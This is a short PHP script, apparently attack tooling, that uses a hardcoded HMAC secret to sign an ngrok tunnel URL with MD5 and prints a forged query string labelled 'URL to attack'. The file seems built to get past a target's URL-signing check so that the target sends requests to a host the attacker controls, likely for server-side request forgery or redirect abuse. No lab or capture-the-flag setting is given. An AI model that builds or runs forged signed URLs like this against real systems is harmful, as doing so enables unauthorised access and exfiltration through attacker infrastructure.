<?php
$hmac_secret = 'eWFw7Li8jKImzw';
$url = 'https://denominative-stalky-jeannine.ngrok-free.dev';

// Calculate the expected MD5 HMAC
$computed_hmac = hash_hmac('md5', $url, $hmac_secret);

echo "URL to attack: ?hmac=" . $computed_hmac . "&url=" . urlencode($url) . "\n";
?>